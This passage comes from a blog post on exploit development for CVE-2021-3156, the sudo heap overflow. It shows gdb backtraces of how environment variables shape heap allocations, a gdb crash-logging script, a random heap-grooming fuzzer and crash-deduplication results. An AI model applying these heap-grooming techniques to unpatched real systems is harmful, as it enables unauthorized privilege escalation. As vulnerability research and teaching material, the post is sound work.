</span></span><span style=display:flex><span><span style=color:#75715e>#12 0x0000593a489d5417 in main (argc=5, argv=0x7fff767b9098, envp=0x7fff767b90c8) at ./sudo.c:192</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// <span style=color:#e6db74>`</span>progname<span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>// We can use arbitrary slashes. For example <span style=color:#e6db74>`</span>./////////0edit<span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>Breakpoint 3, __GI___libc_malloc <span style=color:#f92672>(</span>bytes<span style=color:#f92672>=</span>520<span style=color:#f92672>)</span> at ./malloc/malloc.c:3288
</span></span><span style=display:flex><span>3288	in ./malloc/malloc.c
</span></span><span style=display:flex><span><span style=color:#75715e>#0  __GI___libc_malloc (bytes=520) at ./malloc/malloc.c:3288</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007fab651077c6 in sudo_new_key_val_v1 (key=0x5c947f13ae53 &#34;progname&#34;, val=0x7ffc7d7c590e &#34;.&#34;, &#39;/&#39; &lt;repeats 199 times&gt;...) at ./key_val.c:53</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x00005c947f131a70 in format_plugin_settings (plugin=0x5c947f143920 &lt;policy_plugin&gt;, sudo_settings=0x5c947f141840 &lt;sudo_settings&gt;) at ./sudo.c:1068</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00005c947f131d19 in policy_open (plugin=0x5c947f143920 &lt;policy_plugin&gt;, settings=0x5c947f141840 &lt;sudo_settings&gt;, user_info=0x5c9480455ca0, user_env=0x7ffc7d7c51c8) at ./sudo.c:1104</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x00005c947f12d6eb in main (argc=5, argv=0x7ffc7d7c5198, envp=0x7ffc7d7c51c8) at ./sudo.c:255</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// <span style=color:#e6db74>`</span>LC_CTYPE<span style=color:#e6db74>`</span> indeed affects allocations. One time we set it at <span style=color:#ae81ff>8</span> bytes length and saw allocations of size <span style=color:#ae81ff>34</span>
</span></span><span style=display:flex><span>// and the other time we set it at <span style=color:#ae81ff>16</span> bytes length, seeing allocations of size 42.
</span></span><span style=display:flex><span>  //LC_CTYPE<span style=color:#f92672>=</span>QQQQQQQQ <span style=color:#f92672>(</span>length 8<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  Breakpoint 3, __GI___libc_malloc <span style=color:#f92672>(</span>bytes<span style=color:#f92672>=</span>bytes@entry<span style=color:#f92672>=</span>34<span style=color:#f92672>)</span> at ./malloc/malloc.c:3288
</span></span><span style=display:flex><span>  3288	in ./malloc/malloc.c
</span></span><span style=display:flex><span>  <span style=color:#75715e>#0  __GI___libc_malloc (bytes=bytes@entry=34) at ./malloc/malloc.c:3288</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>#1  0x000074c6c8124d8d in _nl_make_l10nflist (l10nfile_list=l10nfile_list@entry=0x74c6c82bfac0 &lt;_nl_locale_file_list&gt;, dirlist=dirlist@entry=0x74c6c828af50 &lt;_nl_default_locale_path&gt; &#34;/usr/lib/locale&#34;, </span>
</span></span><span style=display:flex><span>      dirlist_len<span style=color:#f92672>=</span>dirlist_len@entry<span style=color:#f92672>=</span>16, mask<span style=color:#f92672>=</span>mask@entry<span style=color:#f92672>=</span>0, language<span style=color:#f92672>=</span>0x7ffcd7b0d250 <span style=color:#e6db74>&#34;QQQQQQQQ&#34;</span>, territory<span style=color:#f92672>=</span>0x0, codeset<span style=color:#f92672>=</span>0x0, normalized_codeset<span style=color:#f92672>=</span>0x0, modifier<span style=color:#f92672>=</span>0x0, 
</span></span><span style=display:flex><span>      filename<span style=color:#f92672>=</span>0x74c6c826746b &lt;_nl_category_names+11&gt; <span style=color:#e6db74>&#34;LC_CTYPE&#34;</span>, do_allocate<span style=color:#f92672>=</span>0<span style=color:#f92672>)</span> at ../intl/l10nflist.c:166
</span></span><span style=display:flex><span>  <span style=color:#75715e>#2  0x000074c6c811eb3c in _nl_find_locale (locale_path=0x74c6c828af50 &lt;_nl_default_locale_path&gt; &#34;/usr/lib/locale&#34;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7ffcd7b0d340)</span>
</span></span><span style=display:flex><span>      at ./locale/findlocale.c:204
</span></span><span style=display:flex><span>  <span style=color:#75715e>#3  0x000074c6c811e38c in __GI_setlocale (category=0, locale=&lt;optimized out&gt;) at ./locale/setlocale.c:337</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>#4  0x0000588355d46417 in main (argc=5, argv=0x7ffcd7b0d728, envp=0x7ffcd7b0d758) at ./sudo.c:192</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Breakpoint 3, __GI___libc_malloc <span style=color:#f92672>(</span>bytes<span style=color:#f92672>=</span>bytes@entry<span style=color:#f92672>=</span>34<span style=color:#f92672>)</span> at ./malloc/malloc.c:3288
</span></span><span style=display:flex><span>  3288	in ./malloc/malloc.c
</span></span><span style=display:flex><span>  <span style=color:#75715e>#0  __GI___libc_malloc (bytes=bytes@entry=34) at ./malloc/malloc.c:3288</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>#1  0x000074c6c8124d8d in _nl_make_l10nflist (l10nfile_list=l10nfile_list@entry=0x74c6c82bfac0 &lt;_nl_locale_file_list&gt;, dirlist=dirlist@entry=0x74c6c828af50 &lt;_nl_default_locale_path&gt; &#34;/usr/lib/locale&#34;, </span>
</span></span><span style=display:flex><span>      dirlist_len<span style=color:#f92672>=</span>dirlist_len@entry<span style=color:#f92672>=</span>16, mask<span style=color:#f92672>=</span>mask@entry<span style=color:#f92672>=</span>0, language<span style=color:#f92672>=</span>0x7ffcd7b0d250 <span style=color:#e6db74>&#34;QQQQQQQQ&#34;</span>, territory<span style=color:#f92672>=</span>0x0, codeset<span style=color:#f92672>=</span>0x0, normalized_codeset<span style=color:#f92672>=</span>0x0, modifier<span style=color:#f92672>=</span>0x0, 
</span></span><span style=display:flex><span>      filename<span style=color:#f92672>=</span>0x74c6c826746b &lt;_nl_category_names+11&gt; <span style=color:#e6db74>&#34;LC_CTYPE&#34;</span>, do_allocate<span style=color:#f92672>=</span>1<span style=color:#f92672>)</span> at ../intl/l10nflist.c:166
</span></span><span style=display:flex><span>  <span style=color:#75715e>#2  0x000074c6c811efbf in _nl_find_locale (locale_path=0x74c6c828af50 &lt;_nl_default_locale_path&gt; &#34;/usr/lib/locale&#34;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7ffcd7b0d340)</span>
</span></span><span style=display:flex><span>      at ./locale/findlocale.c:214
</span></span><span style=display:flex><span>  <span style=color:#75715e>#3  0x000074c6c811e38c in __GI_setlocale (category=0, locale=&lt;optimized out&gt;) at ./locale/setlocale.c:337</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>#4  0x0000588355d46417 in main (argc=5, argv=0x7ffcd7b0d728, envp=0x7ffcd7b0d758) at ./sudo.c:192</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  //LC_CTYPE<span style=color:#f92672>=</span>QQQQQQQQQQQQQQQQ <span style=color:#f92672>(</span>length 16<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>  Breakpoint 3, __GI___libc_malloc <span style=color:#f92672>(</span>bytes<span style=color:#f92672>=</span>bytes@entry<span style=color:#f92672>=</span>42<span style=color:#f92672>)</span> at ./malloc/malloc.c:3288
</span></span><span style=display:flex><span>  3288	in ./malloc/malloc.c
</span></span><span style=display:flex><span>  <span style=color:#75715e>#0  __GI___libc_malloc (bytes=bytes@entry=42) at ./malloc/malloc.c:3288</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>#1  0x000076cd707efd8d in _nl_make_l10nflist (l10nfile_list=l10nfile_list@entry=0x76cd7098aac0 &lt;_nl_locale_file_list&gt;, dirlist=dirlist@entry=0x76cd70955f50 &lt;_nl_default_locale_path&gt; &#34;/usr/lib/locale&#34;, </span>
</span></span><span style=display:flex><span>      dirlist_len<span style=color:#f92672>=</span>dirlist_len@entry<span style=color:#f92672>=</span>16, mask<span style=color:#f92672>=</span>mask@entry<span style=color:#f92672>=</span>0, language<span style=color:#f92672>=</span>0x7ffc1e839f00 <span style=color:#e6db74>&#39;Q&#39;</span> &lt;repeats <span style=color:#ae81ff>16</span> times&gt;, territory<span style=color:#f92672>=</span>0x0, codeset<span style=color:#f92672>=</span>0x0, normalized_codeset<span style=color:#f92672>=</span>0x0, modifier<span style=color:#f92672>=</span>0x0, 
</span></span><span style=display:flex><span>      filename<span style=color:#f92672>=</span>0x76cd7093246b &lt;_nl_category_names+11&gt; <span style=color:#e6db74>&#34;LC_CTYPE&#34;</span>, do_allocate<span style=color:#f92672>=</span>0<span style=color:#f92672>)</span> at ../intl/l10nflist.c:166
</span></span><span style=display:flex><span>  <span style=color:#75715e>#2  0x000076cd707e9b3c in _nl_find_locale (locale_path=0x76cd70955f50 &lt;_nl_default_locale_path&gt; &#34;/usr/lib/locale&#34;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7ffc1e839ff0)</span>
</span></span><span style=display:flex><span>      at ./locale/findlocale.c:204
</span></span><span style=display:flex><span>  <span style=color:#75715e>#3  0x000076cd707e938c in __GI_setlocale (category=0, locale=&lt;optimized out&gt;) at ./locale/setlocale.c:337</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>#4  0x000059fa11824417 in main (argc=5, argv=0x7ffc1e83a3d8, envp=0x7ffc1e83a408) at ./sudo.c:192</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Breakpoint 3, __GI___libc_malloc <span style=color:#f92672>(</span>bytes<span style=color:#f92672>=</span>bytes@entry<span style=color:#f92672>=</span>42<span style=color:#f92672>)</span> at ./malloc/malloc.c:3288
</span></span><span style=display:flex><span>  3288	in ./malloc/malloc.c
</span></span><span style=display:flex><span>  <span style=color:#75715e>#0  __GI___libc_malloc (bytes=bytes@entry=42) at ./malloc/malloc.c:3288</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>#1  0x000076cd707efd8d in _nl_make_l10nflist (l10nfile_list=l10nfile_list@entry=0x76cd7098aac0 &lt;_nl_locale_file_list&gt;, dirlist=dirlist@entry=0x76cd70955f50 &lt;_nl_default_locale_path&gt; &#34;/usr/lib/locale&#34;, </span>
</span></span><span style=display:flex><span>      dirlist_len<span style=color:#f92672>=</span>dirlist_len@entry<span style=color:#f92672>=</span>16, mask<span style=color:#f92672>=</span>mask@entry<span style=color:#f92672>=</span>0, language<span style=color:#f92672>=</span>0x7ffc1e839f00 <span style=color:#e6db74>&#39;Q&#39;</span> &lt;repeats <span style=color:#ae81ff>16</span> times&gt;, territory<span style=color:#f92672>=</span>0x0, codeset<span style=color:#f92672>=</span>0x0, normalized_codeset<span style=color:#f92672>=</span>0x0, modifier<span style=color:#f92672>=</span>0x0, 
</span></span><span style=display:flex><span>      filename<span style=color:#f92672>=</span>0x76cd7093246b &lt;_nl_category_names+11&gt; <span style=color:#e6db74>&#34;LC_CTYPE&#34;</span>, do_allocate<span style=color:#f92672>=</span>1<span style=color:#f92672>)</span> at ../intl/l10nflist.c:166
</span></span><span style=display:flex><span>  <span style=color:#75715e>#2  0x000076cd707e9fbf in _nl_find_locale (locale_path=0x76cd70955f50 &lt;_nl_default_locale_path&gt; &#34;/usr/lib/locale&#34;, locale_path_len=16, category=category@entry=0, name=name@entry=0x7ffc1e839ff0)</span>
</span></span><span style=display:flex><span>      at ./locale/findlocale.c:214
</span></span><span style=display:flex><span>  <span style=color:#75715e>#3  0x000076cd707e938c in __GI_setlocale (category=0, locale=&lt;optimized out&gt;) at ./locale/setlocale.c:337</span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>#4  0x000059fa11824417 in main (argc=5, argv=0x7ffc1e83a3d8, envp=0x7ffc1e83a408) at ./sudo.c:192</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>//<span style=color:#e6db74>`</span>TZ<span style=color:#e6db74>`</span>
</span></span><span style=display:flex><span>Breakpoint 3, __GI___libc_malloc <span style=color:#f92672>(</span>bytes<span style=color:#f92672>=</span>bytes@entry<span style=color:#f92672>=</span>9<span style=color:#f92672>)</span> at ./malloc/malloc.c:3288
</span></span><span style=display:flex><span>3288	in ./malloc/malloc.c
</span></span><span style=display:flex><span><span style=color:#75715e>#0  __GI___libc_malloc (bytes=bytes@entry=9) at ./malloc/malloc.c:3288</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007e5089f6c8ea in __GI___strdup (s=s@entry=0x7ffdfcad7eed &#34;QQQQQQQQ&#34;) at ./string/strdup.c:42</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x00007e5089f93002 in tzset_internal (always=always@entry=1) at ./time/tzset.c:402</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#3  0x00007e5089f931ff in __tzset () at ./time/tzset.c:551</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#4  0x000059e2f38b8444 in main (argc=5, argv=0x7ffdfcad76a8, envp=0x7ffdfcad76d8) at ./sudo.c:196</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>// LOCPATH <span style=color:#f92672>(</span>actually affects a lot. <span style=color:#ae81ff>101</span> locations<span style=color:#f92672>)</span>
</span></span></code></pre></div><h3 id=writing-a-heap-feng-shui-fuzzer>Writing a heap feng shui fuzzer</h3><p>So, let&rsquo;s write our fuzzer now. Our fuzzer will run the <code>sudo</code> binary with argv and environment variable inputs of various lengths. The arguments will always trigger the heap overflow so that we eventually crash. With <code>gdb</code>, we will hook all stop evenets, meaning signals such as <code>SIGABRT</code> and <code>SIGSEGV</code>. When the inferior stops due to a crash, we will collect backtrace infromation regarding where the crash happened so that we can inspect afterwards if the location of the crash is interesting or not.</p><p>Here is our <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/heap-fuzzer/gdbscript.py target=_blank rel="noopener noreferrer">gdbscript</a> that is capable of collecting information upon crashes:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> gdb
</span></span><span style=display:flex><span>HAS_PWNDBG<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span> <span style=color:#75715e>#TODO: Detect dynamically</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>INF <span style=color:#f92672>=</span> gdb<span style=color:#f92672>.</span>inferiors()[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;add-symbol-file /usr/local/libexec/sudo/libsudo_util.so.0&#39;</span>)
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;add-symbol-file /usr/local/libexec/sudo/sudoers.so&#39;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># GDB events:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># https://sourceware.org/gdb/current/onlinedocs/gdb.html/Events-In-Python.html</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exit_handler</span>(event: gdb<span style=color:#f92672>.</span>ExitedEvent):
</span></span><span style=display:flex><span>    <span style=color:#75715e># called when the inferior exits</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> hasattr(event, <span style=color:#e6db74>&#39;exit_code&#39;</span>):
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Inferior exited. exit code: </span><span style=color:#e6db74>{</span>event<span style=color:#f92672>.</span>exit_code<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Inferior exited. exit code: unavailable&#34;</span>)
</span></span><span style=display:flex><span>    gdb<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;quit&#39;</span>)
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>events<span style=color:#f92672>.</span>exited<span style=color:#f92672>.</span>connect(exit_handler)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>stop_handler</span>(event: gdb<span style=color:#f92672>.</span>StopEvent):
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;Inferior stopped: &#34;</span> <span style=color:#f92672>+</span> str(type(event)))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> HAS_PWNDBG:
</span></span><span style=display:flex><span>        gdb<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;set context-output stdout&#39;</span>)
</span></span><span style=display:flex><span>    output  <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span>    output <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;Stop Reason:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> isinstance(event, gdb<span style=color:#f92672>.</span>SignalEvent):
</span></span><span style=display:flex><span>        output <span style=color:#f92672>+=</span> event<span style=color:#f92672>.</span>stop_signal <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        output <span style=color:#f92672>+=</span> str(type(event)) <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    output <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;context:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> HAS_PWNDBG:
</span></span><span style=display:flex><span>        output <span style=color:#f92672>+=</span> gdb<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;context&#39;</span>, to_string<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>    output <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;environment:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    output <span style=color:#f92672>+=</span> gdb<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;show environment&#39;</span>, to_string<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>    output <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#39;bt:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>    output <span style=color:#f92672>+=</span> gdb<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;bt&#39;</span>, to_string<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    print(output)
</span></span><span style=display:flex><span>    gdb<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#39;kill&#39;</span>)
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>events<span style=color:#f92672>.</span>stop<span style=color:#f92672>.</span>connect(stop_handler)
</span></span><span style=display:flex><span>gdb<span style=color:#f92672>.</span>execute(<span style=color:#e6db74>&#34;r&#34;</span>)
</span></span></code></pre></div><p>Next we write our fuzzer which does the following things on a high-level:</p><ul><li>Generates random input (for all <code>argc</code>, <code>argv</code>, and <code>envp</code>)</li><li>Invokes <code>gdb</code> and executes the above gdbscript.<ul><li>At this point, we decide to run <code>sudo</code> as <code>root</code> in order to be able to spawn it with <code>gdb</code> since it is a setuid program.</li><li>Alternatively, we could have modified the <code>sudo</code> binary to do a <code>read(0, buf, 1)</code> during startup. In this way we could run <code>sudo</code> as <code>user</code>, attach to it with <code>gdb</code>, and then continue execution.</li><li>Retrospectively, it was a bad decision to run <code>sudo</code> as <code>root</code> as we will observe at the end of the blog post (no spoilers!)</li></ul></li><li>Collect the output from <code>gdb</code> for runs that crashed (memory corruption)</li><li>Prase the output</li><li>Store the results to a JSON file for further analysis<ul><li>Each crash is stored in its own JSON file</li></ul></li></ul><p>The implementation of the fuzzer is in <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/heap-fuzzer/heap-fuzzer.py target=_blank rel="noopener noreferrer">heap-fuzzer.py</a>. And, honsetly, this is probably some very low quality dumb material as it simply throws random stuff at the binary and does not use any feedback to guide the fuzzer further.</p><p>We <strong>disable ASLR system-wide</strong> and run the fuzzer. Aaaaand let it run there for a few hours&mldr; In the mean time, we also write a parser for our results.</p><h3 id=auto-analyzing-crashes>Auto-analyzing crashes</h3><p>The <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/heap-fuzzer/heap-results-analyzer.py target=_blank rel="noopener noreferrer">heap-results-analyzer.py</a> script is nothing fancy. It simply loads all the crashes, gathers statistics, and prints all the unique crashes that we discovered. We classify two crashes as identical when their backtrace information is the same. Ideally, this would be the case when (a) the number of frames in the backtrace is the same and (b) for each frame, comparing the address across crashes matches. For example, the following two crashes are identical:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#75715e>// Crash 1:</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>0  0x00007ffff7e4ffaf in <span style=color:#a6e22e>unlink_chunk</span> (p<span style=color:#f92672>=</span>p<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>0x5555555935e0, av<span style=color:#f92672>=</span>0x7ffff7f8dc60 <span style=color:#f92672>&lt;</span>main_arena<span style=color:#f92672>&gt;</span>) at .<span style=color:#f92672>/</span>malloc<span style=color:#f92672>/</span>malloc.<span style=color:#a6e22e>c</span>:1622
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>1  0x00007ffff7e52dcd in <span style=color:#a6e22e>_int_malloc</span> (av<span style=color:#f92672>=</span>av<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>0x7ffff7f8dc60 <span style=color:#f92672>&lt;</span>main_arena<span style=color:#f92672>&gt;</span>, bytes<span style=color:#f92672>=</span>bytes<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>3507) at .<span style=color:#f92672>/</span>malloc<span style=color:#f92672>/</span>malloc.<span style=color:#a6e22e>c</span>:4303
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>2  0x00007ffff7e539fa in <span style=color:#a6e22e>__GI___libc_malloc</span> (bytes<span style=color:#f92672>=</span>bytes<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>3507) at .<span style=color:#f92672>/</span>malloc<span style=color:#f92672>/</span>malloc.<span style=color:#a6e22e>c</span>:3315
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>3  0x00007ffff7e5615c in <span style=color:#a6e22e>__argz_create_sep</span> (string<span style=color:#f92672>=</span>0x7fffffffe1b7 <span style=color:#e6db74>&#39;O&#39;</span> <span style=color:#f92672>&lt;</span>repeats 200 times<span style=color:#f92672>&gt;</span>..., delim<span style=color:#f92672>=</span>delim<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>58, argz<span style=color:#f92672>=</span>argz<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>0x7fffffffd790, len<span style=color:#f92672>=</span>len<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>0x7fffffffd798) at .<span style=color:#f92672>/</span>string<span style=color:#f92672>/</span>argz<span style=color:#f92672>-</span>ctsep.<span style=color:#a6e22e>c</span>:34
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>4  0x00007ffff7ded511 in <span style=color:#a6e22e>__GI_setlocale</span> (category<span style=color:#f92672>=</span>6, locale<span style=color:#f92672>=</span>0x555555591e10 <span style=color:#e6db74>&#34;C&#34;</span>) at .<span style=color:#f92672>/</span>locale<span style=color:#f92672>/</span>setlocale.<span style=color:#a6e22e>c</span>:255
</span></span><span style=display:flex><span>...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Crash 2:</span>
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>0  0x00007ffff7e4ffaf in <span style=color:#a6e22e>unlink_chunk</span> (p<span style=color:#f92672>=</span>p<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>0x5555555935e0, av<span style=color:#f92672>=</span>0x7ffff7f8dc60 <span style=color:#f92672>&lt;</span>main_arena<span style=color:#f92672>&gt;</span>) at .<span style=color:#f92672>/</span>malloc<span style=color:#f92672>/</span>malloc.<span style=color:#a6e22e>c</span>:1622
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>1  0x00007ffff7e52dcd in <span style=color:#a6e22e>_int_malloc</span> (av<span style=color:#f92672>=</span>av<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>0x7ffff7f8dc60 <span style=color:#f92672>&lt;</span>main_arena<span style=color:#f92672>&gt;</span>, bytes<span style=color:#f92672>=</span>bytes<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>3507) at .<span style=color:#f92672>/</span>malloc<span style=color:#f92672>/</span>malloc.<span style=color:#a6e22e>c</span>:4303
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>2  0x00007ffff7e539fa in <span style=color:#a6e22e>__GI___libc_malloc</span> (bytes<span style=color:#f92672>=</span>bytes<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>3507) at .<span style=color:#f92672>/</span>malloc<span style=color:#f92672>/</span>malloc.<span style=color:#a6e22e>c</span>:3315
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>3  0x00007ffff7e5615c in <span style=color:#a6e22e>__argz_create_sep</span> (string<span style=color:#f92672>=</span>0x7fffffffe1b7 <span style=color:#e6db74>&#39;P&#39;</span> <span style=color:#f92672>&lt;</span>repeats 200 times<span style=color:#f92672>&gt;</span>..., delim<span style=color:#f92672>=</span>delim<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>58, argz<span style=color:#f92672>=</span>argz<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>0x7fffffffd790, len<span style=color:#f92672>=</span>len<span style=color:#a6e22e>@entry</span><span style=color:#f92672>=</span>0x7fffffffd798) at .<span style=color:#f92672>/</span>string<span style=color:#f92672>/</span>argz<span style=color:#f92672>-</span>ctsep.<span style=color:#a6e22e>c</span>:34
</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span>4  0x00007ffff7ded511 in <span style=color:#a6e22e>__GI_setlocale</span> (category<span style=color:#f92672>=</span>6, locale<span style=color:#f92672>=</span>0x555555591e10 <span style=color:#e6db74>&#34;C&#34;</span>) at .<span style=color:#f92672>/</span>locale<span style=color:#f92672>/</span>setlocale.<span style=color:#a6e22e>c</span>:255
</span></span><span style=display:flex><span>...
</span></span></code></pre></div><p>You see, the number of frames (4) and the addresses match. We do not care that the arguments are different (e.g. <code>'O' &lt;repeats 200 times></code> vs <code>'P' &lt;repeats 200 times></code> in <code>__argz_create_sep</code>).</p><p>Since I had to recompile the binary mid-way fuzzing because of dumb reasons, I chose a bit more coarse grained approach for identifying idnetical crashes. Instead of comparing the address, we compare the pair <code>&lt;funcname>, &lt;source-location></code>. So for example <code>__GI_setlocale, ./locale/setlocale.c:255</code>. (Still you might argue that source line might change if I introduced changes to the source, but I took my risks there. I could have used only the function name but then I could have missed some crashes. Again, ideally we should be comparing addresses.)</p><p>After half a million crashes (565233 to be precise), and some successful executions, we run our results-analyzer and identify 161 unique crashes. The results are stored in <a href=https://github.com/nikosChalk/nikosChalk.github.io/tree/master/static/post-resources/CVE-2021-3156/heap-fuzzer/heap-results-analyzer.out target=_blank rel="noopener noreferrer">heap-results-analyzer.out</a>. Here is some sample output from our analyzer:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-v data-lang=v><span style=display:flex><span><span style=color:#a6e22e>Count</span>: <span style=color:#ae81ff>5</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>Files</span>: inp<span style=color:#ae81ff>.474439</span>, inp<span style=color:#ae81ff>.489563</span>, inp<span style=color:#ae81ff>.513194</span>, inp<span style=color:#ae81ff>.540647</span>, inp<span style=color:#ae81ff>.560127</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#0  0x00007ffff7d2251b in sudoers_policy_main (argc=6, argv=0x7fffffffec18, pwflag=0, env_add=0x0, verbose=false, closure=0x7fffffffe8a0) at ./sudoers.c:572</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#1  0x00007ffff7d1ca7c in sudoers_policy_check (argc=6, argv=0x7fffffffec18, env_add=0x0, command_infop=0x7fffffffe988, argv_out=0x7fffffffe990, user_env_out=0x7fffffffe998) at ./policy.c:872</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#2  0x0000555555572f88 in policy_check (plugin=0x555555583920 &lt;policy_plugin&gt;, argc=6, argv=0x7fffffffec18, env_add=0x0, command_info=0x7fffffffe988, argv_out=0x7fffffffe990, user_env_out=0x7fffffffe998) at ./sudo.c:1186</span>
